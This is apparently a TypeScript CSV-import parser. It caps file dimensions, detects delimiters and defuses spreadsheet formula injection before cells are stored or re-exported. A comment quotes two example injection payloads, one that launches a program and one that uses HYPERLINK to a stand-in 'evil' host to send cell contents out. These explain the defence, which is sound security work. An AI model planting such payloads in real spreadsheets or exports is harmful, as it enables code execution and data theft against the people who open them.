// A CSV parser, written here rather than installed.
//
// Same reasoning as lib/files/zip.ts: this parses files uploaded by
// strangers in a process holding a service-role key, and the two things
// that actually matter — hard caps on every dimension, and neutralising
// formula injection on every cell — are exactly what a general-purpose
// parser does not do.
//
// Client-safe on purpose. The preview the user confirms before anything
// is written is parsed in the browser from the same code the server
// re-parses with, so what they approved and what gets imported cannot
// differ. The server NEVER trusts the client's parse: it re-parses the
// uploaded bytes itself and maps by column NAME, not by index.

/** Rows we will read out of one file. Beyond this the file imports its
 *  first N rows and says so, rather than silently truncating. */
export const MAX_CSV_ROWS = 5000;

/** Columns. A spreadsheet with more than this is not a data export, it
 *  is a pivot table, and mapping it would produce nonsense. */
export const MAX_CSV_COLUMNS = 60;

/** Characters in a single cell. Anything longer is truncated — a cell
 *  holding a novel is a corrupt quote, not a value. */
export const MAX_CELL_CHARS = 2000;

/** Bytes. Smaller than the File Workspace's 20MB because this content is
 *  parsed into memory as strings and then sent to a model. */
export const MAX_CSV_BYTES = 5 * 1024 * 1024;

export type ParsedCsv = {
  headers: string[];
  rows: string[][];
  /** True when the file had more rows than MAX_CSV_ROWS. */
  truncated: boolean;
  totalRowsSeen: number;
};

export class CsvError extends Error {}

/** Leading characters a spreadsheet ignores when deciding whether a cell
 *  is a formula. "\t=1+1" IS a formula, so a check on value[0] alone
 *  misses it. */
const LEADING_NOISE = /^[\s\u0000-\u001f\u007f]+/;

/** A value that is just a number. Kept EXACTLY as it is by the
 *  neutraliser: "-1500.00" is an expense, not an attack, and mangling
 *  every negative number in a finance import to defend against a formula
 *  would be a far worse bug than the one being fixed. Accepts the comma
 *  decimal separator half of Europe exports with. */
const PLAIN_NUMBER = /^[+-]?(\d{1,3}([ ,.']\d{3})*|\d+)([.,]\d+)?$/;

/**
 * Neutralise a cell that a spreadsheet would treat as a formula.
 *
 * THE ATTACK. A cell whose text begins `=`, `+`, `-` or `@` — optionally
 * after whitespace or a control character — is executed by Excel,
 * LibreOffice and Google Sheets when the file is opened.
 * `=cmd|'/c calc'!A1` runs a program on Windows;
 * `=HYPERLINK("http://evil/?"&A1,"Click")` exfiltrates the neighbouring
 * cell to a server.
 *
 * Why it matters in an IMPORTER specifically: our export path
 * (lib/download/table-csv.ts) writes stored values back out. A poisoned cell imported
 * today becomes a live formula in a file the user downloads and opens
 * next week — attacked by their own data, through us. So the payload is
 * defused on the way IN as well as escaped on the way OUT
 * (`escapeCSVValue`), because either alone leaves a hole: neutralising
 * only on import does nothing for rows typed in by hand, and escaping
 * only on export does nothing for a value we hand to some other system.
 *
 * The neutralised form is the original with ONE leading space. It reads
 * identically, and a spreadsheet does not treat " =1+1" as a formula.
 *
 * Callers must NOT trim the result — that would put the payload straight
 * back. Trimming happens INSIDE this function, before the decision, so
 * there is nothing left for a caller to trim.
 */
export function neutraliseFormula(value: string): string {
  const stripped = value.replace(LEADING_NOISE, "").trimEnd();
  if (stripped === "") return "";
  // A plain number keeps its sign and its exact text.
  if (PLAIN_NUMBER.test(stripped)) return stripped;
  if (/^[=+\-@]/.test(stripped)) return ` ${stripped}`;
  return stripped;
}

/** True when the cell would be executed by a spreadsheet as written.
 *  Plain numbers are excluded for the reason above. */
export function isFormulaCell(value: string): boolean {
  const stripped = value.replace(LEADING_NOISE, "").trimEnd();
  if (PLAIN_NUMBER.test(stripped)) return false;
  return /^[=+\-@]/.test(stripped);
}

/**
 * Which delimiter is this file using?
 *
 * Not a nicety: half of Europe exports CSV with semicolons, because
 * their decimal separator is a comma. Guessing wrong turns every row
 * into a single column and the import silently produces one useless
 * field. Decided by counting candidates OUTSIDE quotes on the header
 * line, which is the only line guaranteed to be well-formed.
 */
export function detectDelimiter(sample: string): string {
  const firstLine = sample.split(/\r?\n/, 1)[0] ?? "";
  const candidates = [",", ";", "\t", "|"];

  let best = ",";
  let bestCount = 0;
  for (const candidate of candidates) {
    let count = 0;
    let inQuotes = false;
    for (let i = 0; i < firstLine.length; i++) {
      const ch = firstLine[i];
      if (ch === '"') {
        if (inQuotes && firstLine[i + 1] === '"') i++;
        else inQuotes = !inQuotes;
        continue;
      }
      if (!inQuotes && ch === candidate) count++;
    }
    if (count > bestCount) {
      bestCount = count;
      best = candidate;
    }
  }
  return best;
}

/**
 * Parse RFC 4180, plus the ways real files deviate from it.
 *
 * Handles: quoted fields, doubled quotes inside them, newlines inside
 * quoted fields, CRLF and LF, a UTF-8 BOM, and ragged rows (short rows
 * are padded, long rows are truncated to the header width — a ragged
 * file is a common export bug and refusing it outright helps nobody).
 */
export function parseCsv(text: string, options?: { delimiter?: string }): ParsedCsv {
  // The BOM is invisible in every editor and would otherwise become part
  // of the first header's name, so "Date" never matches "﻿Date".
  let input = text;
  if (input.charCodeAt(0) === 0xfeff) input = input.slice(1);
  if (!input.trim()) throw new CsvError("that file is empty");

  const delimiter = options?.delimiter ?? detectDelimiter(input);

  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;
  let sawAnyChar = false;

  const pushField = () => {
    row.push(field.length > MAX_CELL_CHARS ? field.slice(0, MAX_CELL_CHARS) : field);
    field = "";
  };
  const pushRow = () => {
    pushField();
    // A line that is entirely empty is a blank line, not a record.
    if (!(row.length === 1 && row[0] === "")) rows.push(row);
    row = [];
  };

  for (let i = 0; i < input.length; i++) {
    const ch = input[i];
    sawAnyChar = true;

    if (inQuotes) {
      if (ch === '"') {
        if (input[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += ch;
      }
      continue;
    }

    if (ch === '"') {
      inQuotes = true;
      continue;
    }
    if (ch === delimiter) {
      pushField();
      continue;
    }
    if (ch === "\n") {
      pushRow();
      // Stop early once we have the header plus the row cap. Reading a
      // 40MB file to the end and then throwing most of it away is how a
      // size limit becomes a memory limit that does not hold.
      if (rows.length > MAX_CSV_ROWS + 1) break;
      continue;
    }
    if (ch === "\r") {
      // CRLF: the \n does the work. A lone \r (old Mac) also ends a row.
      if (input[i + 1] === "\n") continue;
      pushRow();
      if (rows.length > MAX_CSV_ROWS + 1) break;
      continue;
    }
    field += ch;
  }

  if (sawAnyChar && (field !== "" || row.length > 0)) pushRow();
  if (rows.length === 0) throw new CsvError("that file has no rows");

  const rawHeaders = rows[0];
  if (rawHeaders.length > MAX_CSV_COLUMNS) {
    throw new CsvError(`that file has more than ${MAX_CSV_COLUMNS} columns`);
  }

  // Headers are neutralised too — they are shown in the UI and can be
  // written back out by the export path just like any other cell.
  const headers = rawHeaders.map((h, index) => {
    const clean = neutraliseFormula(h).slice(0, 120);
    // An unnamed column still needs a stable name: the mapping is by
    // NAME, and two blanks that both map to "" would collapse.
    return clean || `Column ${index + 1}`;
  });

  const width = headers.length;
  const body = rows.slice(1);
  const truncated = body.length > MAX_CSV_ROWS;
  const kept = truncated ? body.slice(0, MAX_CSV_ROWS) : body;

  const normalised = kept.map((r) => {
    const out: string[] = [];
    for (let i = 0; i < width; i++) {
      // NOT trimmed: neutraliseFormula already trimmed, and trimming
      // after it would strip the leading space that defuses a formula.
      out.push(neutraliseFormula(r[i] ?? ""));
    }
    return out;
  });

  return {
    headers,
    rows: normalised,
    truncated,
    totalRowsSeen: body.length,
  };
}

/**
 * A small, representative sample for the model that decides the mapping.
 *
 * Deliberately NOT the first N rows. Exports are frequently sorted, and
 * the first twenty rows of a sorted file can be twenty identical values
 * — from which no column type is inferrable. Taking a spread means the
 * model sees the variety that is actually in the file.
 *
 * It is also the ONLY part of the file that reaches the model. A CSV of
 * customer records is somebody's client list, and sending 5,000 rows of
 * it to infer six column names would be spending their money and their
 * privacy for no extra accuracy.
 */
export function sampleRows(parsed: ParsedCsv, count = 12): string[][] {
  const total = parsed.rows.length;
  if (total <= count) return parsed.rows;

  const step = Math.floor(total / count);
  const out: string[][] = [];
  for (let i = 0; i < count; i++) out.push(parsed.rows[i * step]);
  return out;
}
